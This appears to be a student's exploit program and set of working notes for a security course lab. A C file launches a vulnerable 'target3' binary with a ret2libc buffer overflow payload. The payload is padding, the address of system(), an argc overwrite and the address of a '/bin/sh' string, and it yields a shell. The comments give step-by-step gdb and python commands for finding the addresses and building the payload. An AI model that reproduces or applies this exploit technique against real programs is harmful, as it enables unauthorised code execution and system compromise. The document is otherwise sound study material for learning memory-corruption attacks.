 
#include <stdio.h>
#include <stddef.h> // for NULL
#include <unistd.h>


int main(){
    // 76A + return address + 4B + address of /bin/sh 
    // char *argv[]={"target3","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xd9\x05\x40BBBB\x0b\xfc\xff\xbf", NULL};

    char *argv[]={"target3","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xd9\x05\x40\xff\xff\xff\xff\x48\xfe\xff\xbf/bin/sh", NULL};
    char *envp[]={NULL}; 
    execve("../targets/target3",argv,envp);
    return 0;
}
 
 0x4005d97c  

 \x7c\xd9\x05\x40 

 0xbffffc0b

 \x0b\xfc\xff\xbf
 
 0xbffffe48
 \x48\xfe\xff\xbf


                                                0x4005d97c
0xbffffe40:	0xccffffff	0x6e69622f	0x0068732f	0x400337b6
 
char *argv[]={"target3","AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC", NULL};

 
 
 
 
 
//  Using the same method in question 2, we are able to get the return address of is_virus.
//  To be specific, we set a breakpoint at the ret of is_virus function, the last line of is_virus assembly code. 
//  Under the normal input without overflow, we print \$esp, it should be 804857e, address of instruction right after

//  call   8048474 $\langle is_virus \rangle $

//  but with multiple tests of different input length, we are able to make \$esp becomes 0x42424141 under the following input, 

//  r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB

// YOU CANNOT TRY things such as r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xd9\x05\x40  
// or ./target3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x7c\xd9\x05\x40 
// because the program treat \x7c as string not hex, rather you need do 
//  python -c 'print "A"*76 + "\x7c\xd9\x05\x40" ' > attack3.txt
// ./target  $(cat attack3.txt)
// ./target $(python -c 'print "A"*76 + "\x7c\xd9\x05\x40" ')

// but put \x7c in execve() function *argv[] seems to be fine

//  the input lenght is 80, and 77-80 will overwrite the return address   76A+return address


// (gdb) b main
// (gdb) r normalinput
// (gdb) print system

// system function address: 0x4005d97c    system call address wont change no matter you are gdb exploit3 or gdb target3, but /bin/sh is different

//find out where libc is present   (/bin/sh is definitienly present in libc)
// (gdb) info proc map
// (gdb) find start_address,end_address,pattern 
// but old gdb version does not support find, so i am gonna use another method. system() needs to take the address of /bin/sh as parameter so that a shell can be got as 
the project required. What i did is by putting /bin/sh at the end of the input, because end will have a NULL help the system to get the exact /bin/sh without anything appended

now we need to get the address of our input /bin/sh and put it in the ebp+8 postion, seen several videos below, you will know the system() function paramter address is four bytes 
above the ret address (where system function address is put into). The four bytes between those videos just put things such as BBBB but in our example, this is actually
where argc locates at, so if you put BBBB which would be taken by argc as a positive value, line 16 of target3.c is   
            for (i = 1; i < argc; ++i)
                strcat(traffic, argv[i]);
Then we will have a problem by changing argc from 2 into BBBB, now strcat will be executed many time instead of one, so you need to overwrite this four bytes with a negative
value such as \xff\xff\xff\xff so that strcat only executed once, remember before first strcat happen, argc is still 2 not being overwritten, so at least one strcat execution 
is still ensured and wont be a problem. As four why you replace BBBB with real value 2 (\x02\x00\x00\x00) this is because strcat() function stops at \x00 which it takes as 
a NULL, so the input after \x00 cannot be strcatted (overwritten). 


// https://www.youtube.com/watch?v=Gu_JGaWpcn4
// https://www.youtube.com/watch?v=FvQYGAM1X9U&t=423s

If you dont understand why argc is right above return address, esp+4, you can use gdb, for example, you can breakpoint at the ret of is_virus using b *0x0804853d
now esp is pointing to the return address, i.e., (gdb) x/x $esp is the return address value, 
// this video tells you why when comes to ret step, esp is pointing to the return address 
// https://www.youtube.com/watch?v=seo5Es4pycs&list=PLHMcG0zmCZcj7hKyHgQGGEZ41UWKaISKU&index=8

(gdb) x/10x $esp prints 10 four byte value above the $esp ($esp is included) 
you will find the second out of 10 is 0x0000002 under normally input, first is 0x4005d97c if you make argc 3 by adding one more input, then it becomes 0x0000003 so you know here is argc, and you
should make its value negative so that only one strcat os allowed.   

OK. now to find out /bin/address in the input first use   "A"*76 + "\x7c\xd9\x05\x40" + "\xff\xff\xff\xff" + "C"*4 + "/bin/sh"
and put this input inside char *argv[] of exploit3.c, you CANNOT gdb with target3 using (gdb) r the above print to get the correct address 
because the address of /bin/sh will change and address work for target3 may NOT work for exploit3

to debug target3 inside exploit3 using gdb exploit3 

// catch exec
// symbol-file ../targets/target3
// r
// disas is_virus
// b *0x0804853d  (ret insturction 's address)
// x/10s $esp 
find /bin/sh inside any of those 10 strings if yes, then 
// x/10x $esp 
the leftest side shows the stack address, four example it can be 0xbffffe48. That is what you need to put into the system() argument, which will tell system where it can get /bin/sh 

Now we can set input as "A"*76 + "\x7c\xd9\x05\x40" + "\xff\xff\xff\xff" + "\x48\xfe\xff\xbf" + "/bin/sh" 

DONE!!! The methods i used in this task are helpful for future study i hope, this why i spent so much time on it. 

// find a particular sequence of bytes in the memory space of the program. Perhaps, you want to see all the pointers to a specific object. 
// https://www.youtube.com/watch?v=Gu_JGaWpcn4&list=RDCMUCYa1WtI-vb_bx-anHdmpNfA&start_radio=1&t=31

// the video solution does not work coz we got an old gdb, so use this

// x/500s $esp
// 0xbffffc04:	 "SHELL=/bin/bash"

// 0xbffffc0a "/bin/bash"

// need to skip the SHELL= so plus 6, 5 + 6 =b
// x/s 0xbffffc0b
// 0xbffffc0b:	 "/bin/bash"

// unfortunately, i print more than 500 lines and still no /bin/sh  also since gdb find is not supported in old gdb version, so we have to use the above-mentioned method
// to input /bin/sh by ourselves and figure its address on the stack
//  put string "/bin/sh" in input will not work, because the system don't know where to get that string...
//  So you have to input the address to the string /bin/sh

